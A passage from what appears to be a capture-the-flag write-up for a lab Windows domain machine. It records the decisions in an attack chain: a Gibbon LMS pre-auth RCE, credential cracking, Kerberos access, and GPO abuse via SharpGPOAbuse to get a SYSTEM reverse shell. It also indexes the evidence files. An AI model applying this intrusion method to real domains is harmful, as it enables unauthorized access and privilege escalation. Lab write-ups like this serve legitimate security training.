SharpGPOAbuse Scheduled Task Injection (PowerShell Reverse Shell) →
gpupdate /force (Force GPO Propagation) →
Reverse Shell as NT AUTHORITY\SYSTEM (10.10.14.89:6969) →
Root Flag Capture (C:\Users\Administrator\Desktop\root.txt)
```

### Branch Points and Decisions

**After finding Gibbon:**
- **Option A:** Test default credentials (admin/admin, admin/password)
- **Option B:** Search for CVEs ✓ **CHOSEN**
- **Option C:** Directory fuzzing for other applications
- **Why B:** Pre-auth exploits are highest value; version identified (v25.0.00) made CVE research viable

**After basic RCE:**
- **Option A:** Use unstable command shell for enumeration
- **Option B:** Upgrade to reverse shell ✓ **CHOSEN**
- **Option C:** Upload netcat/tools for better shell
- **Why B:** Reverse shell provides interactivity needed for MySQL queries without upload requirements

**After f.frizzle credentials obtained:**
- **Option A:** Test against Gibbon web login
- **Option B:** Test against Windows services (SMB/SSH/RDP) ✓ **CHOSEN**
- **Option C:** Enumerate LDAP with credentials
- **Why B:** Domain user credentials likely grant access to Windows services; SSH on DC is unusual

**After Kerberos time sync failure:**
- **Option A:** Try ntpdate to sync time
- **Option B:** Manually set time +7 hours ahead ✓ **CHOSEN**
- **Option C:** Abandon Kerberos, use NTLM
- **Why B:** nmap showed +7 hour clock skew; manual sync most reliable

**After SSH access as f.frizzle:**
- **Option A:** Enumerate file shares via SMB
- **Option B:** Check for hidden files in user directories ✓ **CHOSEN**
- **Option C:** Run enumeration scripts (winPEAS)
- **Why B:** Built-in PowerShell avoids AV detection; hidden files often contain secrets

**After finding wapt-backup-sunday.7z:**
- **Option A:** Extract on Windows if 7-Zip installed
- **Option B:** Transfer to Kali via SCP ✓ **CHOSEN**
- **Option C:** Transfer via SMB
- **Why B:** SCP with Kerberos auth works; extraction on Kali avoids Windows limitations

**After m.schoolbus credentials:**
- **Option A:** Enumerate file shares as m.schoolbus
- **Option B:** Run BloodHound to identify permissions ✓ **CHOSEN**
- **Option C:** Try privilege escalation exploits
- **Why B:** Group Policy Creator Owners membership suggests ACL-based escalation path

**After WriteGPLink discovery:**
- **Option A:** Use SharpGPOAbuse to add m.schoolbus to Domain Admins
- **Option B:** Create malicious GPO with SYSTEM reverse shell ✓ **CHOSEN**
- **Option C:** Use GPO to deploy persistence mechanism
- **Why B:** Direct SYSTEM shell faster than Domain Admin → secretsdump workflow

---

## Evidence Files

### Reconnaissance
- `nmap/theFrizzNmapOpenPorts.txt` - Initial port scan (all 65535 ports)
- `nmap/theFrizzNmapServicesVersions.txt` - Service/version scan with scripts
- `logs/gibbon-homepage.html` - Gibbon LMS homepage capture
- `ffuf/gibbon-fuzz.json` - Directory fuzzing results

### Initial Foothold
- `gibbonlms_cmd_shell.py` - Unauthenticated RCE exploit
- `logs/windows reverse shell settings.png` - revshells.com payload generation (Gibbon RCE)

### Credential Harvesting
- `evidence/gibbonCreds.txt` - MySQL database credentials
- `evidence/gibbonCredsDB.txt` - Full gibbonperson table dump
- `evidence/gibbonCredsFull.txt` - f.frizzle hash + salt for cracking (mode 1420)

### Kerberos Authentication
- `krb5.conf` - Generated Kerberos configuration file
- `f.frizzle.ccache` - Ticket Granting Ticket for f.frizzle
- `m.schoolbus.ccache` - Ticket Granting Ticket for m.schoolbus

### User Flag
- `evidence/user_flag.txt` - User flag (f.frizzle Desktop)

### Lateral Movement
- `wapt-backup-sunday.7z` - Deleted archive from Recycle Bin (30MB)
- `wapt/conf/waptserver.ini` - WAPT server configuration with base64 password
- `evidence/ldapsearch_f.frizzle.txt` - LDAP enumeration output
- `evidence/impacket-rpcdump-f.frizzle.txt` - RPC endpoint enumeration

### BloodHound
- `bloodhound/20260121005619_bloodhound.zip` - BloodHound collection (all data)

### Privilege Escalation
- `SharpGPOAbuse.exe` - GPO abuse tool
- `logs/revshell-gpo-settings.png` - revshells.com payload generation (GPO attack)
- `evidence/GPT.INI` - Group Policy template metadata
- `evidence/GptTmpl.inf` - Group Policy template configuration

### Root Flag
- `evidence/root_flag.txt` - Root flag (Administrator Desktop)

### Credential Tracking
- `loot/credentials.md` - Organized credential tracking (all users)
- `attack-chain.md` - Complete attack path with decision points
